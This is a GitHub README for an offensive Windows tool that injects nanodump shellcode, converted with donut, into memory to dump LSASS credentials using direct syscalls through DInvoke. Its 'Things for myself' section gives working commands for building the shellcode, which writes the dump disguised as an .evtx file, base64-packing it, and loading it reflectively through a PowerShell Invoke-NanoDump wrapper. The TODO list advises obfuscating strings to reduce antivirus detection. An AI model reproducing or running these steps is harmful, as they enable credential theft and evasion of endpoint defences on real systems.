# sNanoDumpInject 

Minor syscall edit to [@s3cur3th1ssh1t](https://twitter.com/ShitSecure)'s [NanoDumpInject.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs) from this [blog post](https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/).  

This repo contains code with donut'ed nanodump. DO NOT RUN random shellcodes inside random 0-star github repos. 

## Credits 

All credits to:
- @s3cur3th1ssh1t, @S4ntiagoP, @rastamouse, @ccob, 
- https://offensivedefence.co.uk/posts/Dynamic-syscalls/ 
- https://github.com/CCob/SharpBlock/blob/master/Program.cs#L37

Original Blog post & code: https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/

## Edits 

Added syscalls for the `Inject()` function. Small project to practice syscalls using DInvoke and creating a small syscall-only DInvoke.

## MISC/TODOs 

- Static Detection for DInvoke usually occurs in DInvoke strings. Use projects like [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) to reduce hits (13 -> 3)

- Learn what this PatchExit function is, and replace with syscalls as well? 

- Using most up-to-date 06/12/2022 nanodump + donut doesn't work - the powershell process will crash upon `NtCreateThreadEx`. Need to find the correct commit for both nanodump + donut, `git reset --hard <hash>`, and retry creating donut'ed nanodump. 

## Things for myself 
```
# donut 
donut.exe -i <path>\nanodump.x64.exe -b=1 -t -p "--write C:\windows\temp\trash2.evtx" -o C:\nanodump.bin

# Copy/Paste base64'ed nanodump 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("c:\nanodump.bin")) | clip

# Debugging  

$base64binary = [convert]::tobase64string((get-content -path "<path>\sNanoDumpInject\bin\Release\sNanoDumpInject.dll" -encoding byte ))
$RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
[sNanoDumpInject.Program]::Inject(1) <# change 1 or 2 depending on nanodump shellcode #>

# Copy/Paste base64'ed sNanoDumpInject to the original powershell 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<path>\sNanoDumpInject\bin\Release\sNaNoDumpInject.dll")) | clip

# Reflective Loader by S3cur3th1ssh1t
function Invoke-NanoDump
{
<#
    .DESCRIPTION
        Execute NanoDump Shellcode to dump lsass.
        Main Credits to https://github.com/helpsystems/nanodump
        Author: Fabian Mosch, Twitter: @ShitSecure
    #>

Param
    (
        [switch]
        $valid
)

if ($valid)
{
    $choice = 1
}
else
{
    $choice = 2
}
    # Source code here: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
	$base64binary = "<b64>"
	$RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [NanoDumpInject.Program]::Inject($choice)
  
}
```